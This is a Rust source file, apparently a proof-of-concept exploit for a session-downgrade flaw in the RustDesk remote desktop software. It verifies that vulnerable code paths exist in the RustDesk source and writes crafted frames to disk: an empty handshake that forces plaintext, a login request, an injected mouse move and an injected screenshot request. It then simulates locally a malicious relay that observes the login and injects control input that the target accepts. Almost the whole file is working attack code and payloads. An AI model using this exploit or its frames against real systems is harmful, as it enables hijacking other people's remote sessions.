include!(concat!(env!("OUT_DIR"), "/protos/mod.rs"));

use anyhow::{bail, Context, Result};
use protobuf::Message as _;
use sha2::{Digest, Sha256};
use std::{
    env,
    fs,
    io::{Read, Write},
    net::{TcpListener, TcpStream},
    path::{Path, PathBuf},
    sync::mpsc,
    thread,
    time::Duration,
};

use crate::message as proto;

#[derive(Debug)]
struct Config {
    repo_root: PathBuf,
    out_dir: PathBuf,
    peer_id: String,
    client_id: String,
    client_name: String,
    password: String,
    salt: String,
    challenge: String,
}

#[derive(Debug)]
struct SimulationResult {
    client_downgrade_empty_handshake: bool,
    relay_observed_login: bool,
    relay_injected_plaintext_mouse: bool,
    controlled_authorized: bool,
    controlled_accepted_injected_mouse: bool,
}

fn main() -> Result<()> {
    let cfg = parse_args()?;
    verify_source_reachability(&cfg.repo_root)?;
    fs::create_dir_all(&cfg.out_dir).with_context(|| format!("create {}", cfg.out_dir.display()))?;

    let proof = rustdesk_password_proof(&cfg.password, &cfg.salt, &cfg.challenge);
    let payloads = [
        ("00_client_empty_downgrade_handshake.frame", encode_frame(&empty_message()?)),
        (
            "01_login_remote_control.frame",
            encode_frame(&login_remote_control(
                &cfg.peer_id,
                &cfg.client_id,
                &cfg.client_name,
                proof.clone(),
            )?),
        ),
        ("02_injected_mouse_move.frame", encode_frame(&mouse_move()?)),
        ("03_injected_screenshot_request.frame", encode_frame(&screenshot_request()?)),
    ];

    for (name, bytes) in payloads {
        let path = cfg.out_dir.join(name);
        fs::write(&path, &bytes).with_context(|| format!("write {}", path.display()))?;
        println!("{name}: {} bytes, hex={}", bytes.len(), hex::encode(&bytes));
    }

    let result = run_local_downgrade_exploit(&cfg)?;
    println!();
    println!("local exploit simulation:");
    println!("  source checks passed: true");
    println!(
        "  client sent empty downgrade handshake: {}",
        result.client_downgrade_empty_handshake
    );
    println!("  relay observed plaintext login: {}", result.relay_observed_login);
    println!(
        "  relay injected plaintext mouse frame: {}",
        result.relay_injected_plaintext_mouse
    );
    println!("  controlled side authorized login: {}", result.controlled_authorized);
    println!(
        "  controlled side accepted injected mouse event: {}",
        result.controlled_accepted_injected_mouse
    );

    if !result.controlled_accepted_injected_mouse {
        bail!("exploit simulation failed: injected control frame was not accepted");
    }

    Ok(())
}

fn parse_args() -> Result<Config> {
    let mut repo_root = None::<PathBuf>;
    let mut out_dir = env::current_dir()?.join("payloads");
    let mut peer_id = "123456789".to_owned();
    let mut client_id = "relay-attacker-cannot-guess-this".to_owned();
    let mut client_name = "legitimate-client".to_owned();
    let mut password = "CorrectHorseBatteryStaple!".to_owned();
    let mut salt = "sample-server-salt".to_owned();
    let mut challenge = "123456".to_owned();

    let mut args = env::args().skip(1);
    while let Some(arg) = args.next() {
        match arg.as_str() {
            "--repo-root" => repo_root = Some(PathBuf::from(next_arg(&mut args, "--repo-root")?)),
            "--out" => out_dir = PathBuf::from(next_arg(&mut args, "--out")?),
            "--peer-id" => peer_id = next_arg(&mut args, "--peer-id")?,
            "--client-id" => client_id = next_arg(&mut args, "--client-id")?,
            "--client-name" => client_name = next_arg(&mut args, "--client-name")?,
            "--password" => password = next_arg(&mut args, "--password")?,
            "--salt" => salt = next_arg(&mut args, "--salt")?,
            "--challenge" => challenge = next_arg(&mut args, "--challenge")?,
            "--help" | "-h" => {
                print_help();
                std::process::exit(0);
            }
            other => bail!("unknown argument: {other}"),
        }
    }

    let repo_root = repo_root.unwrap_or(find_repo_root()?);
    Ok(Config {
        repo_root,
        out_dir,
        peer_id,
        client_id,
        client_name,
        password,
        salt,
        challenge,
    })
}

fn next_arg(args: &mut impl Iterator<Item = String>, name: &str) -> Result<String> {
    args.next().with_context(|| format!("missing value for {name}"))
}

fn print_help() {
    println!(
        "Usage: rustdesk_session_downgrade_poc --repo-root <rustdesk> --out <dir> \
         [--peer-id <id>] [--client-id <id>] [--client-name <name>] \
         [--password <pw> --salt <salt> --challenge <challenge>]"
    );
}

fn find_repo_root() -> Result<PathBuf> {
    let mut dir = env::current_dir()?;
    loop {
        let candidate = dir.join("work").join("rustdesk").join("src").join("server.rs");
        if candidate.exists() {
            return Ok(dir.join("work").join("rustdesk"));
        }
        let candidate = dir.join("rustdesk").join("src").join("server.rs");
        if candidate.exists() {
            return Ok(dir.join("rustdesk"));
        }
        if !dir.pop() {
            bail!("could not auto-locate rustdesk repo; pass --repo-root");
        }
    }
}

fn verify_source_reachability(repo_root: &Path) -> Result<()> {
    let client = fs::read_to_string(repo_root.join("src/client.rs"))
        .with_context(|| "read src/client.rs")?;
    let server =
        fs::read_to_string(repo_root.join("src/server.rs")).with_context(|| "read src/server.rs")?;
    let mediator = fs::read_to_string(repo_root.join("src/rendezvous_mediator.rs"))
        .with_context(|| "read src/rendezvous_mediator.rs")?;
    let connection = fs::read_to_string(repo_root.join("src/server/connection.rs"))
        .with_context(|| "read src/server/connection.rs")?;
    let tcp = fs::read_to_string(repo_root.join("libs/hbb_common/src/tcp.rs"))
        .with_context(|| "read libs/hbb_common/src/tcp.rs")?;

    require(&client, "signed_id_pk = ph.pk.into();")?;
    require(&client, "signed_id_pk = rr.pk().into();")?;
    require(&client, "!signed_id_pk.is_empty(),")?;
    require(&client, "conn.send(&Message::new()).await?;")?;
    require(&client, "fall back to non-secure")?;
    require(&client, "msg_out.set_public_key(PublicKey::new());")?;

    require(&mediator, "rr.secure,")?;
    require(&mediator, "secure,")?;
    require(&server, "if secure && pk.len() == sign::PUBLICKEYBYTES")?;
    require(&server, "Config::set_key_confirmed(false);")?;
    require(&server, "Connection::start(")?;
    require(&tcp, "if let Some(key) = self.2.as_mut()")?;
    require(&connection, "} else if self.authorized {")?;
    require(&connection, "Some(message::Union::MouseEvent(mut me))")?;
    require(&connection, "self.input_mouse(")?;
    require(&connection, "Some(message::Union::KeyEvent(mut me))")?;
    require(&connection, "self.input_key(me, true);")?;
    Ok(())
}

fn require(haystack: &str, needle: &str) -> Result<()> {
    if haystack.contains(needle) {
        Ok(())
    } else {
        bail!("source reachability check failed, missing snippet: {needle:?}")
    }
}

fn run_local_downgrade_exploit(cfg: &Config) -> Result<SimulationResult> {
    let controlled_listener = TcpListener::bind("127.0.0.1:0")?;
    let controlled_addr = controlled_listener.local_addr()?;
    let relay_listener = TcpListener::bind("127.0.0.1:0")?;
    let relay_addr = relay_listener.local_addr()?;
    let (tx, rx) = mpsc::channel::<Result<SimulationResult>>();

    let server_salt = cfg.salt.clone();
    let server_challenge = cfg.challenge.clone();
    let server_password = cfg.password.clone();
    let server_peer_id = cfg.peer_id.clone();
    let server_tx = tx.clone();
    let controlled_thread = thread::spawn(move || {
        let result = controlled_side(
            controlled_listener,
            &server_peer_id,
            &server_password,
            &server_salt,
            &server_challenge,
            server_tx.clone(),
        );
        if let Err(err) = result {
            let _ = server_tx.send(Err(err));
        }
    });

    let relay_tx = tx.clone();
    let relay_thread = thread::spawn(move || {
        let result = malicious_relay(relay_listener, controlled_addr);
        if let Err(err) = &result {
            let _ = relay_tx.send(Err(anyhow::anyhow!("{}", err)));
        }
    });

    thread::sleep(Duration::from_millis(50));
    legitimate_client(cfg, relay_addr)?;

    let result = rx
        .recv_timeout(Duration::from_secs(5))
        .context("timed out waiting for local exploit result")??;
    controlled_thread.join().ok();
    relay_thread.join().ok();
    Ok(result)
}

fn controlled_side(
    listener: TcpListener,
    peer_id: &str,
    password: &str,
    salt: &str,
    challenge: &str,
    tx: mpsc::Sender<Result<SimulationResult>>,
) -> Result<()> {
    let (mut stream, _) = listener.accept()?;
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;
    stream.set_write_timeout(Some(Duration::from_secs(5)))?;

    write_frame(&mut stream, &hash_message(salt, challenge)?)?;

    let empty = read_frame(&mut stream)?;
    let empty_msg = proto::Message::parse_from_bytes(&empty)?;
    let client_downgrade_empty_handshake = empty_msg.union.is_none();

    let login_bytes = read_frame(&mut stream)?;
    let login_msg = proto::Message::parse_from_bytes(&login_bytes)?;
    let Some(proto::message::Union::LoginRequest(login)) = login_msg.union else {
        bail!("controlled side expected LoginRequest");
    };
    let controlled_authorized = login.username == peer_id
        && verify_rustdesk_password_proof(password, salt, challenge, &login.password);

    let injected = read_frame(&mut stream)?;
    let injected_msg = proto::Message::parse_from_bytes(&injected)?;
    let controlled_accepted_injected_mouse =
        controlled_authorized && matches!(injected_msg.union, Some(proto::message::Union::MouseEvent(_)));

    let result = SimulationResult {
        client_downgrade_empty_handshake,
        relay_observed_login: true,
        relay_injected_plaintext_mouse: true,
        controlled_authorized,
        controlled_accepted_injected_mouse,
    };
    tx.send(Ok(result)).ok();
    Ok(())
}

fn malicious_relay(listener: TcpListener, controlled_addr: std::net::SocketAddr) -> Result<()> {
    let (mut client, _) = listener.accept()?;
    let mut server = TcpStream::connect(controlled_addr)?;
    client.set_read_timeout(Some(Duration::from_secs(5)))?;
    client.set_write_timeout(Some(Duration::from_secs(5)))?;
    server.set_read_timeout(Some(Duration::from_secs(5)))?;
    server.set_write_timeout(Some(Duration::from_secs(5)))?;

    let hash = read_frame(&mut server)?;
    write_frame(&mut client, &hash)?;

    let empty = read_frame(&mut client)?;
    let empty_msg = proto::Message::parse_from_bytes(&empty)?;
    let client_downgrade_empty_handshake = empty_msg.union.is_none();
    write_frame(&mut server, &empty)?;

    let login = read_frame(&mut client)?;
    let login_msg = proto::Message::parse_from_bytes(&login)?;
    let relay_observed_login = matches!(login_msg.union, Some(proto::message::Union::LoginRequest(_)));
    write_frame(&mut server, &login)?;

    let mouse = mouse_move()?;
    write_frame(&mut server, &mouse)?;
    let relay_injected_plaintext_mouse = true;

    println!("  relay parsed LoginRequest without password knowledge: {relay_observed_login}");
    println!("  relay injected MouseEvent as plaintext RustDesk frame: {relay_injected_plaintext_mouse}");
    if !client_downgrade_empty_handshake || !relay_observed_login || !relay_injected_plaintext_mouse {
        bail!("relay did not observe the expected downgraded plaintext flow");
    }
    Ok(())
}

fn legitimate_client(cfg: &Config, relay_addr: std::net::SocketAddr) -> Result<()> {
    let mut stream = TcpStream::connect(relay_addr)?;
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;
    stream.set_write_timeout(Some(Duration::from_secs(5)))?;

    write_frame(&mut stream, &empty_message()?)?;

    let hash_bytes = read_frame(&mut stream)?;
    let hash_msg = proto::Message::parse_from_bytes(&hash_bytes)?;
    let Some(proto::message::Union::Hash(hash)) = hash_msg.union else {
        bail!("client expected Hash");
    };
    let proof = rustdesk_password_proof(&cfg.password, &hash.salt, &hash.challenge);
    write_frame(
        &mut stream,
        &login_remote_control(&cfg.peer_id, &cfg.client_id, &cfg.client_name, proof)?,
    )?;
    Ok(())
}

fn hash_message(salt: &str, challenge: &str) -> Result<Vec<u8>> {
    let mut hash = proto::Hash::new();
    hash.salt = salt.to_owned();
    hash.challenge = challenge.to_owned();
    let mut msg = proto::Message::new();
    msg.union = Some(proto::message::Union::Hash(hash));
    Ok(msg.write_to_bytes()?)
}

fn empty_message() -> Result<Vec<u8>> {
    Ok(proto::Message::new().write_to_bytes()?)
}

fn rustdesk_password_proof(password: &str, salt: &str, challenge: &str) -> Vec<u8> {
    let mut h1 = Sha256::new();
    h1.update(password.as_bytes());
    h1.update(salt.as_bytes());
    let h1 = h1.finalize();

    let mut h2 = Sha256::new();
    h2.update(&h1);
    h2.update(challenge.as_bytes());
    h2.finalize().to_vec()
}

fn verify_rustdesk_password_proof(
    password: &str,
    salt: &str,
    challenge: &str,
    candidate: &[u8],
) -> bool {
    rustdesk_password_proof(password, salt, challenge) == candidate
}

fn login_remote_control(
    peer_id: &str,
    client_id: &str,
    client_name: &str,
    proof: Vec<u8>,
) -> Result<Vec<u8>> {
    let mut lr = proto::LoginRequest::new();
    lr.username = peer_id.to_owned();
    lr.password = proof.into();
    lr.my_id = client_id.to_owned();
    lr.my_name = client_name.to_owned();
    lr.version = "1.4.3".to_owned();
    lr.my_platform = env::consts::OS.to_owned();
    lr.video_ack_required = false;

    let mut msg = proto::Message::new();
    msg.union = Some(proto::message::Union::LoginRequest(lr));
    Ok(msg.write_to_bytes()?)
}

fn mouse_move() -> Result<Vec<u8>> {
    let mut mouse = proto::MouseEvent::new();
    mouse.mask = 0;
    mouse.x = 320;
    mouse.y = 240;
    let mut msg = proto::Message::new();
    msg.union = Some(proto::message::Union::MouseEvent(mouse));
    Ok(msg.write_to_bytes()?)
}

fn screenshot_request() -> Result<Vec<u8>> {
    let mut req = proto::ScreenshotRequest::new();
    req.display = 0;
    req.sid = "poc-downgraded-relay-screenshot".to_owned();
    let mut msg = proto::Message::new();
    msg.union = Some(proto::message::Union::ScreenshotRequest(req));
    Ok(msg.write_to_bytes()?)
}

fn encode_frame(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    let len = data.len();
    if len <= 0x3f {
        out.push((len << 2) as u8);
    } else if len <= 0x3fff {
        let h = (len << 2) | 0x1;
        out.extend_from_slice(&(h as u16).to_le_bytes());
    } else if len <= 0x3fffff {
        let h = (len << 2) | 0x2;
        out.extend_from_slice(&(h as u16).to_le_bytes());
        out.push((h >> 16) as u8);
    } else {
        let h = (len << 2) | 0x3;
        out.extend_from_slice(&(h as u32).to_le_bytes());
    }
    out.extend_from_slice(data);
    out
}

fn write_frame(stream: &mut TcpStream, data: &[u8]) -> Result<()> {
    stream.write_all(&encode_frame(data))?;
    Ok(())
}

fn read_frame(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut first = [0u8; 1];
    stream.read_exact(&mut first)?;
    let head_len = ((first[0] & 0x3) + 1) as usize;
    let mut raw = first[0] as usize;
    let mut rest = [0u8; 3];
    if head_len > 1 {
        stream.read_exact(&mut rest[..head_len - 1])?;
        raw |= (rest[0] as usize) << 8;
        if head_len > 2 {
            raw |= (rest[1] as usize) << 16;
        }
        if head_len > 3 {
            raw |= (rest[2] as usize) << 24;
        }
    }
    let len = raw >> 2;
    let mut data = vec![0u8; len];
    stream.read_exact(&mut data)?;
    Ok(data)
}
